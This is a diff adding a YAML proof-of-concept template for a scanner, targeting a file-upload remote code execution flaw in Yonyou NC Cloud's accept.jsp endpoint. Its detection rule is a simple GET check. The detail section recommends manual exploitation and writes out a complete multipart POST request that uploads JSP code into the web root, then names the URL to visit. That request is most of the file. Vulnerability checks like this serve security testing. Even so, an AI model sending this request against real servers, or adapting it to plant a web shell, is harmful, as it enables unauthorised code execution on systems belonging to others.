@@ -1,0 +1,34 @@
+name: poc-yaml-yongyou-NC-Cloud-accept-upload-rce
+rules:
+  - method: GET
+    path: /aim/equipmap/accept.jsp
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("parent.afterUpload"))
+detail:
+    info: |
+      文件上传数据包有问题，建议手动利用
+      POST /aim/equipmap/accept.jsp HTTP/1.1
+      Host:
+      User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+      Connection: close
+      Content-Length: 449
+      Accept: */*
+      Accept-Encoding: gzip, deflate
+      Content-Type: multipart/form-data; boundary=---------------------------2acJUFIO5idBPx1Hf4mwqDeKnOTeD
+
+      -----------------------------2acJUFIO5idBPx1Hf4mwqDeKnOTeD
+      Content-Disposition: form-data; name="upload"; filename="2ZQK71Lzouupwx6IYOj9VFWBKtu.txt"
+      Content-Type: text/plain
+
+      <% out.println("2ZQK6wKE6fsVJZ1gbDPXEf2Omm4"); %>
+      -----------------------------2acJUFIO5idBPx1Hf4mwqDeKnOTeD
+      Content-Disposition: form-data; name="fname"
+
+      \webapps\nc_web\2ZQK6x4c4Pk2YZoAw9DMrgz6Mmj.jsp
+      -----------------------------2acJUFIO5idBPx1Hf4mwqDeKnOTeD--
+
+      上传完成后访问http://127.0.0.1/2ZQK6x4c4Pk2YZoAw9DMrgz6Mmj.jsp
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/G9346QFpmn8Rle85xtwoig
